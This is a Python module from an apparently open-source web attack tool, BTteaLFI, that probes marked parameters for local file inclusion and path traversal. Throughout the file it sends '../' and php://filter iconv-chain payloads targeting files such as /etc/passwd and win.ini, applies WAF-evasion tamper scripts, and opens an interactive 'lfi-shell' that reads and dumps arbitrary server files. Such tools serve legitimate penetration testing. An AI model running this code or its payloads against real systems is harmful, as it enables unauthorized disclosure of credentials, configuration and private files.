# BTteaLFI
# Copyright (C) 2024-2025 BTtea
#
# This file is licensed under GPLv2. See LICENSE.txt for details.

import re
import json
import importlib
from base64 import b64encode
from random import choices
from string import ascii_letters
from copy import deepcopy
from core.CreateHeader import build_headers
from core.Requester import SendRequest
from core.ParseHeader import ParseHeaders
from lib.InitializationArgv import ANSIcolors,MsgEvent,AskQuestion


def CatchErrorMessage(res):
    _match=[]
    pattern = re.compile(r"(Fatal error|Deprecated|Warning).*? in .*? on line .*?\d+", re.DOTALL)
    _match = pattern.search(res)
    if _match:
        return _match[0]
    else:
        return _match


def DetectBackendApplication(res):
    # 後綴對應字典
    exts = ['.php', '.aspx', '.asp', '.jsp']
    os='linux'
    for ext in exts:
        pattern = re.compile(rf"[^\s\"'>]+{ext}(?=[^A-Za-z0-9]|$)", re.IGNORECASE)
        match = pattern.findall(res)
        if match:  
            for i in match:
                if bool(re.match(r'^[A-Za-z]:[\\/]', i)):
                    os='windows'
                    break
            return [os,ext, match]
    return []



def RandomString(length=6) -> str:
    return ''.join(choices(ascii_letters, k=length))

def FindSkipTest(prompt_message:str,_skip_prompt:list) -> bool:
    for current_skip in _skip_prompt:
        if current_skip in prompt_message:
            return True
    return False


def SanitizeFilename(filename: str) -> str:
    # 定義各系統非法字元（Windows 常見: \ / : * ? " < > |）
    # POSIX 系統只禁止 /，Windows 會禁止更多
    illegal_chars = r'[\/:*?"<>|]'
    return re.sub(illegal_chars, "_", filename)


def TakeContents(data, pre="", suf=""):
    if pre == "" and suf == "":
        # 兩個都空，就直接整個字串
        return [data]
    elif pre == "":
        # 只有 suf，當開頭到 suf
        pattern = rf"^(.*?){re.escape(suf)}"
    elif suf == "":
        # 只有 pre，當 pre 到結尾
        pattern = rf"{re.escape(pre)}(.*?)$"
    else:
        # 一般情況
        pattern = rf"{re.escape(pre)}(.*?){re.escape(suf)}"
    return re.findall(pattern, data, flags=re.DOTALL)


def FormattedSize(s:str):
    unit='B'
    num=len(s)
    
    if num>1024:
        unit='KB'
        num/=1024

    if num>1024:
        unit='MB'
        num/=1024

    if num>1024:
        unit='GB'
        num/=1024
    
    return f'{num:.2f}'.rstrip("0").rstrip(".") + f' {unit}'



def HTTP_code_status(code):
    _http_status={
        '204':'No Content',
        '301':'Moved Permanently',
        '302':'Found',
        '400':'Bad Request',
        '401':'Unauthorized',
        '403':'Forbidden',
        '404':'Not Found',
        '500':'Internal Server Error',
        '502':'Bad Gateway',
        '503':'Service Unavailable',
        '504':'Gateway Timeout',
    }
    return f"{str(code)} ('{_http_status[str(code)]}')"


def iconv_lfi(s:str):
    base64_payload = b64encode(s.encode('utf-8')).decode('utf-8')
    filters = "convert.base64-encode|convert.base64-encode|convert.base64-encode|convert.iconv.utf-8.utf-7|"
    for c in base64_payload[::-1]:
            filters += open(f"./core/iconv/{format(ord(c),'x')}").read() + "|"
            filters += "convert.base64-decode|convert.base64-encode|"
    filters += "convert.base64-decode"
    final_payload = f"php://filter/{filters}/resource%3D"
    return final_payload



def test_connectivity(target,argv={"POST":"","GET":""}):
    
    tmp_target=deepcopy(target)
    tmp_target.url.get_query=tmp_target.url.get_query.replace('*','')
    if tmp_target.body:
        tmp_target.body.body=tmp_target.body.body.replace('*','')

    req=build_headers(tmp_target,argv=argv)
    print(MsgEvent(tmp_target.DebugLevel(),'TRAFFIC OUT',f'HTTP request:\n{req}'),end='')
    
    res=''
    for retry in range(target.args.retries):
        try:
            res=SendRequest(tmp_target,req)
        except KeyboardInterrupt:
            
            print(MsgEvent(target.DebugLevel(),'WARNING',f'user aborted during detection phase'),end='')
            question = f"how do you want to proceed? [(K)eep testing/(q)uit] "
            _choices = ['K','q']
            default  = 'K'
            tmp_target.args.batch=False
            r=AskQuestion(question,_choices,default,tmp_target)
            if r=='K':
                retry-=1
                continue
            return r

        except Exception as e:
            print(MsgEvent(target.DebugLevel(),'CRITICAL',f'connection timed out to the target URL. sqlmap is going to retry the request(s)'),end='')
            print(MsgEvent(target.DebugLevel(),'DEBUG',f'connection timed out to the target URL. sqlmap is going to retry the request'),end='')
        if res:
            break
    
    if res=='':
        print(MsgEvent(target.DebugLevel(),'WARNING',f"if the problem persists please check that the provided target URL is reachable. In case that it is, you can try to rerun with switch '--random-agent' and/or '--tamper option (e.g. --tamper dotslashobfuscate)'",BoldFlag=True),end='')
        return res

    res_content=ParseHeaders(res)
    print(MsgEvent(tmp_target.DebugLevel(),'TRAFFIC IN',f'HTTP response ({res_content.status_code} {res_content.reason_phrase}):\n{res_content.response if tmp_target.DebugLevel()>=6 else res_content.head}'),end='')

    return res_content


def TamperPipeLine(tampers:list,payload:str) -> str:
    if tampers:
        for tamper in tampers:
            bypass = importlib.import_module(f"tamper.{tamper}")
            payload=bypass.tamper(payload)
    return payload


def CombineCurrentInjection(mark:str,index:int,parts:list):
    test_case = "".join(
        parts[j] + (mark if j == index else "")
        for j in range(len(parts))
    )
    return test_case


def UpdateRequestPayload(target,HTTP_method,payload):
    if HTTP_method=='POST':
        target.body.body=payload
    if HTTP_method=='GET':
        target.url.url=payload
        target.url.RenewURL()
    return target



def find_injection_points(target,HTTP_method):
    from os import listdir

    if HTTP_method=='POST':
        parts = target.body.body.split("*")
    if HTTP_method=='GET':
        parts = target.url.url.split("*")

    find_payloads={
        "app"        : "",
        "os_version" : "",
        "os_type"    : "",
        "os_banner"  : "",
        "app_banner" : "",
        "technique"  : []
    }

    for current_file in listdir('./core/payloads/'):

        if target.args.os != 'all' and target.args.os != current_file.split('.')[0]:
            continue
            
        with open(f'./core/payloads/{current_file}', 'r', encoding='utf-8') as file:
            payloads_data=json.load(file)

        for currnet_injec_index in range(len(parts)-1):
            tmp_target=deepcopy(target)
            print(MsgEvent(target.DebugLevel(),'INFO',f"testing {HTTP_method} parameter '#{currnet_injec_index+1}*'"),end='')

            # testing XSS
            if not bool(target.args.skip_xss):
                xss_test=f"'{RandomString()}<'\">{RandomString()}"

                xss_test=TamperPipeLine(tmp_target.tampers(),xss_test)
                test_case=CombineCurrentInjection(xss_test,currnet_injec_index,parts)
                tmp_target=UpdateRequestPayload(tmp_target,HTTP_method,test_case)

                print(MsgEvent(target.DebugLevel(),'PAYLOAD',test_case),end='')

                res_content=test_connectivity(tmp_target)
                
                if res_content=='Q' or res_content=='':
                    return

                if res_content:
                    if res_content.status_code!=200:
                        print(MsgEvent(target.DebugLevel(),'DEBUG',f'got the http code : {HTTP_code_status(res_content.status_code)}'),end='')

                    if xss_test in res_content.body:
                        print(MsgEvent(target.DebugLevel(),'INFO',f"heuristic (XSS) test shows that {HTTP_method} parameter '#{currnet_injec_index+1}*' might be vulnerable to cross-site scripting (XSS) attacks",BoldFlag=True),end='')

                    _errmsg=CatchErrorMessage(res_content.body)
                    if  _errmsg:
                        result=DetectBackendApplication(_errmsg)

                        if result:
                            print(MsgEvent(target.DebugLevel(),'DEBUG',f"Captured backend physical path from the error message: '{result[2][0]}'."),end='')
                            print(MsgEvent(target.DebugLevel(),'INFO',f"An error message was captured, which disclosed backend technologies: the operating system is '{result[0].capitalize()}' and the backend technology is '{result[1][1:].upper()}'.",BoldFlag=True),end='')

                            if not bool(find_payloads['app']):
                                find_payloads['app']=result[1][1:].upper()

                            if target.args.os == 'all':
                                question = f"Based on the captured error message, the detected operating system is '{result[0].capitalize()}'. Do you want to skip payload testing for other operating systems? [Y/n] "
                                _choices = ['Y','n']
                                default  = 'Y'
                                res=AskQuestion(question,_choices,default,target)
                                if res=='Y':
                                    target.args.os=result[0]
                                    tmp_target.args.os=result[0]
                                    find_payloads["os_banner"]=result[0].capitalize()
                                    find_payloads["os_type"]=result[0].capitalize()

                if target.args.os != 'all' and target.args.os != current_file.split('.')[0]:
                    break

            # testing php://filter
            if 'PHP_F' in target.technique:
                if target.args.os == 'windows' and target.args.php_wrapper == '/etc/passwd':
                    target.args.php_wrapper='C:/windows/win.ini'
                    tmp_target.args.php_wrapper='C:/windows/win.ini'
                elif target.args.os == 'all':
                    if current_file.split('.')[0] == 'windows' and target.args.php_wrapper == '/etc/passwd':
                        target.args.php_wrapper='C:/windows/win.ini'
                        tmp_target.args.php_wrapper='C:/windows/win.ini'

                _current_prompt_message=f"testing 'php://filter' access to the file '{tmp_target.args.php_wrapper}'"
                res_skip=FindSkipTest(_current_prompt_message,target.test_skip)
                if res_skip:
                    print(MsgEvent(target.DebugLevel(),'DEBUG',f"skipping test {_current_prompt_message}"),end='')
                else:
                    print(MsgEvent(target.DebugLevel(),'INFO',_current_prompt_message),end='')
                    iconv_lfi_string=RandomString()
                    php_filter_test=iconv_lfi(iconv_lfi_string)+tmp_target.args.php_wrapper
                    if 'php-cgi/php-cgi.exe?%AD' in target.url.url:
                        php_filter_test=f"%22{php_filter_test}%22"
                    php_filter_test=tmp_target.args.prefix + php_filter_test + tmp_target.args.suffix

                    php_filter_test=TamperPipeLine(tmp_target.tampers(),php_filter_test)
                    test_case=CombineCurrentInjection(php_filter_test,currnet_injec_index,parts)
                    tmp_target=UpdateRequestPayload(tmp_target,HTTP_method,test_case)

                    print(MsgEvent(target.DebugLevel(),'PAYLOAD',test_case),end='')

                    res_content=test_connectivity(tmp_target)
                
                    if res_content=='Q' or res_content=='':
                        return
                    

                    if res_content.status_code!=200:
                        print(MsgEvent(target.DebugLevel(),'DEBUG',f'got the http code : {HTTP_code_status(res_content.status_code)}'),end='')

                    if iconv_lfi_string in res_content.body:
                        print(MsgEvent(target.DebugLevel(),'INFO',f"{HTTP_method} parameter '#{currnet_injec_index+1}*' appears to support 'php://filter' injection, allowing access to the '{tmp_target.args.php_wrapper}' file.",BoldFlag=True),end='')

                        if target.args.backend_app == 'all':
                            target.args.backend_app='php'
                            tmp_target.args.backend_app='php'
                            print(MsgEvent(target.DebugLevel(),'INFO',f"Detected that the backend application is likely 'PHP'. Switching payloads to PHP.",BoldFlag=True),end='')
                            find_payloads['app']='PHP'

                        find_payloads['technique'].append(
                            {
                                'HTTP_method':HTTP_method,
                                'Parameter_Name':f'#{currnet_injec_index+1}*',
                                'Type':'php://filter wrapper',
                                'Payload':f"php://filter/convert.base64-encode/resource={target.args.php_wrapper}"
                            }
                        )


            for injection_path_type,path_type_data in payloads_data.items():
                
                tmp_target=deepcopy(target)
                injection_path_type_flag=False

                for backend_app_type,backend_tech_data in payloads_data[injection_path_type].items():
                    if target.args.backend_app != 'all' and backend_app_type not in ['all',target.args.backend_app]:
                        continue
                    backend_tech=payloads_data[injection_path_type][backend_app_type]

                    # /etc/php/{0}/fpm/php.ini 有版本路徑
                    if backend_tech['version']:
                        for ver in backend_tech['version']:
                            _current_skip_continue=False
                            # ['php', '<=', '5']
                            if target.test_skip:
                                # version skip test
                                for current_skip in target.test_skip:
                                    
                                    if len(current_skip.split())==3:
                                        # 如果不符合條件則跳過
                                        _skip=current_skip.split()
                                        try:
                                            if _skip[0] not in ["all","php","asp","aspx","jsp"] or _skip[1] not in ['>','>=','<','<=','==','!=']:
                                                continue
                                            float(current_skip.split()[2])
                                        except:
                                            continue
                                        # 符合條件則嘗試
                                        try:
                                            if _skip[0] == backend_app_type:
                                                if _skip[1] == '>' and float(ver) > float(_skip[2]):
                                                    _current_skip_continue=True
                                                    break
                                                elif _skip[1] == '>=' and float(ver) >= float(_skip[2]):
                                                    _current_skip_continue=True
                                                    break
                                                elif _skip[1] == '<' and float(ver) < float(_skip[2]):
                                                    _current_skip_continue=True
                                                    break
                                                elif _skip[1] == '<=' and float(ver) <= float(_skip[2]):
                                                    _current_skip_continue=True
                                                    break
                                                elif _skip[1] == '==' and float(ver) == float(_skip[2]):
                                                    _current_skip_continue=True
                                                    break
                                                elif _skip[1] == '!=' and float(ver) != float(_skip[2]):
                                                    _current_skip_continue=True
                                                    break
                                        except:
                                            pass
                                

                            for p in backend_tech['data']:
                                _current_prompt_message=f"testing {p['message'].format(ver)}"

                                # level test
                                if p['level']>tmp_target.args.level:
                                    continue


                                if _current_skip_continue:
                                    print(MsgEvent(target.DebugLevel(),'DEBUG',f"skipping test {_current_prompt_message}"),end='')
                                    continue

                                # 絕對路徑測試
                                if injection_path_type == 'absolute_path' and 'AP' in target.technique:
                                    
                                    
                                    res_skip=FindSkipTest(_current_prompt_message,target.test_skip)
                                    if res_skip:
                                        print(MsgEvent(target.DebugLevel(),'DEBUG',f"skipping test {_current_prompt_message}"),end='')
                                        continue

                                    print(MsgEvent(target.DebugLevel(),'INFO',_current_prompt_message),end='')
                                    current_payload=tmp_target.args.prefix + p['path'].format(ver) + tmp_target.args.suffix
                                    
                                    current_payload=TamperPipeLine(tmp_target.tampers(),current_payload)
                                    test_case=CombineCurrentInjection(current_payload,currnet_injec_index,parts)
                                    tmp_target=UpdateRequestPayload(tmp_target,HTTP_method,test_case)

                                    print(MsgEvent(target.DebugLevel(),'PAYLOAD',test_case),end='')
                                    
                                    res_content=test_connectivity(tmp_target)
                                    
                                    if res_content=='Q' or res_content=='':
                                        return
                                    
                                    
                                    if res_content.status_code!=200:
                                        print(MsgEvent(target.DebugLevel(),'DEBUG',f'got the http code : {HTTP_code_status(res_content.status_code)}'),end='')
                                    
                                    if p['content'] in res_content.body:
                                        injection_path_type_flag=True
                                        
                                        print(MsgEvent(target.DebugLevel(),'INFO',f"{HTTP_method} parameter '#{currnet_injec_index+1}*' appears to support {injection_path_type.replace('_',' ')} injection, allowing access to the '{p['path'].format(ver)}' file.",BoldFlag=True),end='')

                                        if target.args.os == 'all':
                                            DetectedOS=current_file.split('.')[0].capitalize()
                                            print(MsgEvent(target.DebugLevel(),'INFO',f"Detected that the backend system is likely '{DetectedOS}'. Switching payloads to {DetectedOS}.",BoldFlag=True),end='')
                                            target.args.os=current_file.split('.')[0]
                                            find_payloads['os_type']=target.args.os
                                        
                                        find_payloads['technique'].append(
                                            {
                                                'HTTP_method':HTTP_method,
                                                'Parameter_Name':f'#{currnet_injec_index+1}*',
                                                'Type':injection_path_type.replace('_',' '),
                                                'Payload':current_payload,
                                                'move':0
                                            }
                                        )

                                        break
                                # 相對路徑測試
                                elif injection_path_type == 'relative_path' and 'RP' in target.technique:
                                    
                                    _current_prompt_message=f"testing {p['message'].replace('absolute path','relative path').format(ver)}"
                                    res_skip=FindSkipTest(_current_prompt_message,target.test_skip)
                                    if res_skip:
                                        print(MsgEvent(target.DebugLevel(),'DEBUG',f"skipping test {_current_prompt_message}"),end='')
                                        continue

                                    move_path='../'
                                    print(MsgEvent(target.DebugLevel(),'INFO',_current_prompt_message),end='')
                                    if target.args.path_depth:
                                        target.args.move=target.args.path_depth
                                    for move in range(target.args.path_depth,target.args.move+1):
                                        if move == 0:
                                            continue
                                        current_payload=tmp_target.args.prefix + move_path*(move) + p['path'].format(ver) + tmp_target.args.suffix
                                        
                                        current_payload=TamperPipeLine(tmp_target.tampers(),current_payload)
                                        test_case=CombineCurrentInjection(current_payload,currnet_injec_index,parts)
                                        tmp_target=UpdateRequestPayload(tmp_target,HTTP_method,test_case)

                                        print(MsgEvent(target.DebugLevel(),'PAYLOAD',test_case),end='')

                                        res_content=test_connectivity(tmp_target)
                                        
                                        if res_content=='Q' or res_content=='':
                                            return

                                        if res_content.status_code!=200:
                                            print(MsgEvent(target.DebugLevel(),'DEBUG',f'got the http code : {HTTP_code_status(res_content.status_code)}'),end='')

                                        if p['content'] in res_content.body:
                                            injection_path_type_flag=True
                                                                                        
                                            print(MsgEvent(target.DebugLevel(),'INFO',f"{HTTP_method} parameter '#{currnet_injec_index+1}*' appears to support {injection_path_type.replace('_',' ')} injection, allowing access to the '{move_path*(move)}{p['path'].format(ver)}' file.",BoldFlag=True),end='')

                                            if target.args.os == 'all':
                                                DetectedOS=current_file.split('.')[0].capitalize()
                                                print(MsgEvent(target.DebugLevel(),'INFO',f"Detected that the backend system is likely '{DetectedOS}'. Switching payloads to {DetectedOS}.",BoldFlag=True),end='')
                                                target.args.os=current_file.split('.')[0]
                                                find_payloads['os_type']=target.args.os
                                            
                                            find_payloads['technique'].append(
                                                {
                                                    'HTTP_method':HTTP_method,
                                                    'Parameter_Name':f'#{currnet_injec_index+1}*',
                                                    'Type':injection_path_type.replace('_',' '),
                                                    'Payload':current_payload,
                                                    'move':move
                                                }
                                            )

                                            break

                                
                                
                                if injection_path_type_flag:
                                    break
                            if injection_path_type_flag:
                                break
                        if injection_path_type_flag:
                            break

                    # /etc/hosts 無版本路徑
                    else:
                        for p in backend_tech['data']:
                            # level test
                            if p['level']>tmp_target.args.level:
                                continue
                                
                            # 絕對路徑測試
                            if injection_path_type == 'absolute_path' and 'AP' in target.technique:
                                
                                _current_prompt_message=f"testing {p['message']}"
                                res_skip=FindSkipTest(_current_prompt_message,target.test_skip)
                                if res_skip:
                                    print(MsgEvent(target.DebugLevel(),'DEBUG',f"skipping test {_current_prompt_message}"),end='')
                                    continue
                                

                                print(MsgEvent(target.DebugLevel(),'INFO',_current_prompt_message),end='')
                                current_payload=tmp_target.args.prefix + p['path'] + tmp_target.args.suffix
                                
                                current_payload=TamperPipeLine(tmp_target.tampers(),current_payload)
                                test_case=CombineCurrentInjection(current_payload,currnet_injec_index,parts)
                                tmp_target=UpdateRequestPayload(tmp_target,HTTP_method,test_case)

                                print(MsgEvent(target.DebugLevel(),'PAYLOAD',test_case),end='')

                                res_content=test_connectivity(tmp_target)
                                
                                if res_content=='Q' or res_content=='':
                                    return

                                if res_content.status_code!=200:
                                    print(MsgEvent(target.DebugLevel(),'DEBUG',f'got the http code : {HTTP_code_status(res_content.status_code)}'),end='')

                                if p['content'] in res_content.body:

                                    injection_path_type_flag=True
                                    
                                    print(MsgEvent(target.DebugLevel(),'INFO',f"{HTTP_method} parameter '#{currnet_injec_index+1}*' appears to support {injection_path_type.replace('_',' ')} injection, allowing access to the '{p['path']}' file.",BoldFlag=True),end='')

                                    if target.args.os == 'all':
                                        DetectedOS=current_file.split('.')[0].capitalize()
                                        print(MsgEvent(target.DebugLevel(),'INFO',f"Detected that the backend system is likely '{DetectedOS}'. Switching payloads to {DetectedOS}.",BoldFlag=True),end='')
                                        target.args.os=current_file.split('.')[0]
                                        find_payloads['os_type']=target.args.os

                                    find_payloads['technique'].append(
                                        {
                                            'HTTP_method':HTTP_method,
                                            'Parameter_Name':f'#{currnet_injec_index+1}*',
                                            'Type':injection_path_type.replace('_',' '),
                                            'Payload':current_payload,
                                            'move':0
                                        }
                                    )

                                    break
                            # 相對路徑測試
                            elif injection_path_type == 'relative_path' and 'RP' in target.technique:

                                _current_prompt_message=f"testing {p['message'].replace('absolute path','relative path')}"
                                res_skip=FindSkipTest(_current_prompt_message,target.test_skip)
                                if res_skip:
                                    print(MsgEvent(target.DebugLevel(),'DEBUG',f"skipping test {_current_prompt_message}"),end='')
                                    continue


                                move_path='../'
                                print(MsgEvent(target.DebugLevel(),'INFO',_current_prompt_message),end='')
                                if target.args.path_depth:
                                    target.args.move=target.args.path_depth
                                for move in range(target.args.path_depth,target.args.move+1):
                                    if move == 0:
                                        continue
                                    current_payload=tmp_target.args.prefix + move_path*(move) + p['path'] + tmp_target.args.suffix
                                    
                                    current_payload=TamperPipeLine(tmp_target.tampers(),current_payload)
                                    test_case=CombineCurrentInjection(current_payload,currnet_injec_index,parts)
                                    tmp_target=UpdateRequestPayload(tmp_target,HTTP_method,test_case)

                                    print(MsgEvent(target.DebugLevel(),'PAYLOAD',test_case),end='')

                                    res_content=test_connectivity(tmp_target)
                                    
                                    if res_content=='Q' or res_content=='':
                                        return

                                    if res_content.status_code!=200:
                                        print(MsgEvent(target.DebugLevel(),'DEBUG',f'got the http code : {HTTP_code_status(res_content.status_code)}'),end='')

                                    if p['content'] in res_content.body:
                                        injection_path_type_flag=True
                                        
                                        print(MsgEvent(target.DebugLevel(),'INFO',f"{HTTP_method} parameter '#{currnet_injec_index+1}*' appears to support {injection_path_type.replace('_',' ')} injection, allowing access to the '{move_path*(move)}{p['path']}' file.",BoldFlag=True),end='')

                                        if target.args.os == 'all':
                                            DetectedOS=current_file.split('.')[0].capitalize()
                                            print(MsgEvent(target.DebugLevel(),'INFO',f"Detected that the backend system is likely '{DetectedOS}'. Switching payloads to {DetectedOS}.",BoldFlag=True),end='')
                                            target.args.os=current_file.split('.')[0]
                                            find_payloads['os_type']=target.args.os

                                        find_payloads['technique'].append(
                                            {
                                                'HTTP_method':HTTP_method,
                                                'Parameter_Name':f'#{currnet_injec_index+1}*',
                                                'Type':injection_path_type.replace('_',' '),
                                                'Payload':current_payload,
                                                'move':move
                                            }
                                        )

                                        break

                            if injection_path_type_flag:
                                break
                        if injection_path_type_flag:
                            break
                    if injection_path_type_flag:
                        break
        if bool(find_payloads['technique'])==False:
            print(MsgEvent(target.DebugLevel(),'WARNING',f"(custom) {HTTP_method} parameter '#{currnet_injec_index+1}*' does not seem to be injectable"),end='')
        else:
            break
    return find_payloads



def loading_attack_module(target):

    # if is *
    if '*' in target.body.body:
        result=find_injection_points(target,'POST')
        if result and result['technique']:
            return result

    if '*' in target.url.url:
        result=find_injection_points(target,'GET')
        if result and result['technique']:
            return result
    
    return



def find_exploit_points(target,poc):
    import os
    from urllib.parse import quote

    res='1'
    items_number={
        'absolute path':1,
        'relative path':2,
        'php://filter wrapper':3
    }
    for i in range(len(poc['technique'])):
        for j in range(len(poc['technique'])):
            if items_number[poc['technique'][i]['Type']]<items_number[poc['technique'][j]['Type']]:
                poc['technique'][i],poc['technique'][j]=poc['technique'][j],poc['technique'][i]


    if len(poc['technique'])>1:
        question=f"Which path traversal technique should be used?\n[1] {poc['technique'][0]['Type']} (default)\n"

        for i in range(1,len(poc['technique'])):
            question+=f"[{i+1}] {poc['technique'][i]['Type']}\n"
        question+="> "
        _choices=list(map(str, range(1, len(poc['technique'])+1)))
        default='1'
        res=AskQuestion(question,_choices,default,target)

    MainExploitTechnique=poc['technique'][int(res)-1]

    if MainExploitTechnique["HTTP_method"]=='POST':
        parts = target.body.body.split("*")
    if MainExploitTechnique["HTTP_method"]=='GET':
        parts = target.url.url.split("*")

    match=''
    mark=''
    # relative path
    if MainExploitTechnique['Type'] == 'relative path':
        match = re.match(r'^(?:\.\./)+', MainExploitTechnique['Payload'])[0]

    # php://filter wrapper
    if MainExploitTechnique['Type'] == 'php://filter wrapper':
        question = f"Whether to use the default Base64 encoding filter? [Y/n] "
        _choices = ['Y','n']
        default  = 'Y'
        res=AskQuestion(question,_choices,default,target)
        if res != 'Y':
            match = MainExploitTechnique['Payload'].split('convert.base64-encode/resource=')[0]
            match = match + input(f"{ANSIcolors.BOLD}Enter a filter (e.g., 'convert.base64-encode'): {ANSIcolors.RESET}") + '/resource='
        else:
            match='php://filter/convert.base64-encode/resource='
        match=quote(match)

    print(MsgEvent(target.DebugLevel(),'INFO',"To quit type 'x' or 'q' and press ENTER"),end='')

    for currnet_injec_index in range(len(parts)-1):

        if int(poc['technique'][0]['Parameter_Name'][1:2]) != (currnet_injec_index+1):
            continue

        while True:
            tmp_target=deepcopy(target)
            mark = input('lfi-shell> ')

            if mark in ['x','q']:
                return

            mark=quote(mark)

            # relative path
            if MainExploitTechnique['Type'] == 'relative path':
                if mark.startswith('/'):
                    mark=mark[1:]
                mark = f"{match}{mark}"

            # php://filter wrapper
            if MainExploitTechnique['Type'] == 'php://filter wrapper':
                mark = f"{match}{mark}"

            if 'php-cgi/php-cgi.exe?%AD' in target.url.url:
                mark=f"%22{mark}%22"

            mark=tmp_target.args.prefix + mark + tmp_target.args.suffix

            mark=TamperPipeLine(tmp_target.tampers(),mark)
            test_case=CombineCurrentInjection(mark,currnet_injec_index,parts)
            tmp_target=UpdateRequestPayload(tmp_target,MainExploitTechnique["HTTP_method"],test_case)

            print(MsgEvent(target.DebugLevel(),'PAYLOAD',test_case),end='')

            res_content=test_connectivity(tmp_target)
            if res_content=='':
                print(MsgEvent(target.DebugLevel(),'WARNING',f"Request failed. Please check if the network is stable or if it was blocked by WAF protection.",BoldFlag=True),end='')
                continue
            
            if res_content=='Q':
                return

            if res_content.status_code!=200:
                print(MsgEvent(target.DebugLevel(),'DEBUG',f'got the http code : {HTTP_code_status(res_content.status_code)}'),end='')

            match_res=TakeContents(res_content.body, pre=tmp_target.args.detect_prefix, suf=tmp_target.args.detect_suffix)
            
            if match_res:
                print(MsgEvent(target.DebugLevel(),'DEBUG',f"The size of file '{mark}' is {FormattedSize(match_res[0])}."),end='')
                if len(match_res[0])==0:
                    print(MsgEvent(target.DebugLevel(),'WARNING','Detected file size is 0, the file may not exist or access is denied.'),end='')

                if tmp_target.args.dump:
                    if not os.path.exists(f'.saves/{target.url.domain}'):
                        os.makedirs(f'.saves/{target.url.domain}')
                    if not os.path.exists(f'.saves/{target.url.domain}/dump'):
                        os.makedirs(f'.saves/{target.url.domain}/dump')
                    
                    with open(f'.saves/{target.url.domain}/dump/{SanitizeFilename(mark)}', "w", encoding="utf-8") as f:
                        f.write(match_res[0])
                    print(f'File {mark} has been downloaded to')
                    print(f'[*] .saves/{target.url.domain}/dump/{SanitizeFilename(mark)}\n')
                else:
                    print(f"[*] '{mark}' output:\n{match_res[0]}\n")

            else:
                print(MsgEvent(target.DebugLevel(),'WARNING','Defined prefix/suffix not found in the page, no output matched.'),end='')




def loading_dump_file_module(target,poc):

    # if is *
    if '*' in target.body.body or '*' in target.url.url:
        find_exploit_points(target,poc)

    return


def find_rce_points(target,poc):
    pass


def loading_get_shell_module(target,poc):

    # if is *
    if '*' in target.body.body or '*' in target.url.url:
        result=find_rce_points(target,poc)
    
    return
